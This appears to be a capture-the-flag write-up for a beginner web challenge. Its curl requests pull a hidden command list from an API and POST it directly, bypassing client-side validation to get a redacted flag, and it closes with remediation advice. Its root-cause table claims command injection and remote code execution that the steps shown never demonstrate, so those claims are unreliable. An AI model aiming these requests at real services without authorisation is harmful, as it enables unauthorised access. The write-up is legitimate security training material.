---
title: Terminal Adventure
date: 2026-11-09
type: Web
Difficulty: Very Easy
summary: A browser-based terminal adventure game. The goal is to bypass client-side input validation and interact with the backend API directly to extract the flag.
tags: [Linux, Web, PrivEsc]
Flag Format: HTB{...}
draft: false
---

---
## Reconnaissance

### Step 1 — Fetch Available Commands

The frontend JS calls `/api/options` on load to populate the list of allowed commands, including a hidden `secret` array not shown to the player.

```bash
curl http://<TARGET_IP>/api/options
```

**Response:**
```json
{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

This reveals all valid commands the server will accept, including ones hidden from the player UI.

---

## Vulnerability

The input validation is **entirely client-side**:

```js
// commander.js — frontend only
if (availableOptions[currentStep].includes(currentCommand) 
    || availableOptions['secret'].includes(currentCommand)) {
    await fetch('/api/monitor', { ... })
}
```

The `/api/monitor` endpoint receives the `command` field with **no server-side validation**. This means:

1. We can skip the frontend entirely and POST arbitrary commands directly.
2. The server likely executes or interprets the command value — making it vulnerable to **command injection**.

---

## Exploitation

### Step 2 — Send Secret Commands Directly

```bash
curl -s -X POST http://<TARGET_IP>/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}' | python3 -m json.tool
```


### Step 3 — Get the Flag

**Response:**
```json
{
    "message": "HTB{REDACTED}"
}
```

---

## Root Cause

| Layer      | Issue                                                      |
|------------|------------------------------------------------------------|
| Frontend   | Command allow-list only enforced in JavaScript             |
| Backend    | `/api/monitor` accepts and executes arbitrary input        |
| Impact     | Full bypass of game logic + Remote Code Execution          |

---

## Fix / Remediation

- **Validate on the server**: Re-check the command against the allowed list in the backend before processing.
- **Never trust client input**: Frontend validation is UX only — never a security boundary.
- **Sanitize shell input**: If the command value is ever passed to a shell, use parameterized execution (e.g. `execFile` instead of `exec` in Node.js).

---

## Summary

> The challenge hides a set of "secret" commands in a client-side JS fetch from `/api/options`. By querying this endpoint directly and then POSTing arbitrary commands to `/api/monitor`, we bypass the frontend game logic entirely and trigger the flag response.